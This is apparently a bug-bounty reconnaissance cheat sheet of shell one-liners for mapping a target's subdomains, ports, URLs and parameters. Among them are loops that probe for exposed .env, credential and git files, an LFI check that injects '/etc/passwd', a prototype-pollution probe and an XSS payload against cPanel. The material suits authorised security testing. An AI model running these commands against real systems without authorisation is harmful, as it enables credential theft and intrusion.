Technology identification.
```
whatweb -a [https://www.example.com] -v
```
WHOIS 
```
whois verylazytech.com
```
WAF Fingerprinting.
```
wafw00f -v [https://example.com]
```
Urls Extraction
```
hakrawler -url https://target.com -depth 2
```
forgotten test endpoints
```
waybackurls http://target.com | gf test-endpoints
```
crt.sh
```
curl -s "https://crt.sh/?q=%.verylazytech.com&output=json" | jq -r '.[].name_value' | sort -u
```
Waybackurls
```
cat domains.txt | waybackurls > wayback-results.txt
```
Sensitive file discovery
```
cat alive-domains.txt | while read host; do host=$(echo "$host" | sed 's|http://||;s|https://||;s|:80||'); for path in /config.js /config.json /app/config.js /settings.json /database.json /firebase.json /.env /.env.production /.env.local /.env.example /.env.bak /.env.backup /api-keys.json /credentials.json /secret.json /google-services.json /package.json /package-lock.json /composer.json /po.xml /docker-compose.yml /manifest.json /service-worker.js /config.yml /config.yaml /config.xml /config.php /web.config /config.bak /config.example /config/secrets.json /config/keys.json; do echo "http://${host}${path} https://${host}${path}"; done; done | httpx -mc 200,301,302,403 -retries 2 -threads 100 -o leaks.txt
```
Parameter pollution detection
```
cat alive-domains.txt | httpx -silent -threads 300 | anew -q FILE.txt && sed 's/$/\/?__proto__[testparam]=exploit/' FILE.txt | page-fetch -j 'window.testparam == "exploit"? "[VULNERABLE]" : "[NOT VULNERABLE]"' | sed "s/(//g" | sed "s/)//g" | sed "s/JS //g" | grep "VULNERABLE"
```
Config probing 
```
subfinder -d example.com -silent | while read host; do for path in /config.js /config.json /app/config.js /settings.json /database.json /firebase.json /.env /.env.production /.env.local /.env.example /.env.bak /.env.backup /api-keys.json /credentials.json /secret.json /google-services.json /package.json /package-lock.json /composer.json /po.xml /docker-compose.yml /manifest.json /service-worker.js /config.yml /config.yaml /config.xml /config.php /web.config /config.bak /config.example /config/secrets.json /config/keys.json /_wpeprivate/config.json /.git/config; do echo "http://${host}${path}"; done; done | httpx -mc 200,301,302,403
```
API config & cPanel checks
```
cat cleansubs.txt | httpx -silent -path 'api/index.php/v1/config/application?public=true' -mc 200
```
```
cat cleansubs.txt | httpx -silent -ports http:80,https:443,2082,2083 -path '/cpanelwebcall/<img%20src=x%20onerror="prompt(document.domain)">aaaaaaaaaaaaaaa' -mc 400
```
```
cat cleansubs.txt | httpx -silent -nc -p 80,443,8080,8443,9000,9001,9002,9003,8088 -path "/wp-config.PHP" -mc 200 -t 60 -status-code
```
 Shodan & memory dumps
 ```
shodan search org: "Target" http.favicon.hash:116323821 --fields ip_str,port --separator | awk '{print $1 $2}'
```
 JSON & Confluence checks
 ```
cat cleansubs.txt | waybackurls | httpx -mc 200 -ct | grep application/json
```
 Auth & S3 discovery, LFI, directory fuzzing
 ```
cat alive-domains.txt | httpx | anew hosts; meg -d 1000 -v /; gf s3-buckets
```
LFI Testing
```
cat alive-domains.txt | while read sub; do gau $sub; done | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
```
Discover Hidden Parameters
```
x8 -u https://example.com -X GET -b '{%s}' --http 1.1 -t urlencoded --custom-parameters admin debug _debug disable --custom-values 1 0 false off null true yes no -m 20 -H "Header: Value" -c 5 -o x8-OUT.txt -O url
```
```
arjun -u https://example.com/api/user -m POST
```
Git-Dumper
```
git-dumper https://target.com/.git /output-dir
```
BBOT
```
bbot -t example.com --modules subdomain-enum,dns,portscan,http
```

# port enumeration
```
shodan search "ssl:'domain.tld'" --fields ip_str --limit 1000 >> ips.txt
cat alive-domains.txt ips.txt | sort -u > all-assets.txt
```
```
naabu -list all-assets.txt -top-ports 1000 -sV -o all-assets-with-ports.txt -silent -c 50
```
```
rustscan -a all-assets.txt -r 1-65535 --ulimit 5000 -b 50 -- -Pn -oG all-assets-with-ports.txt
```
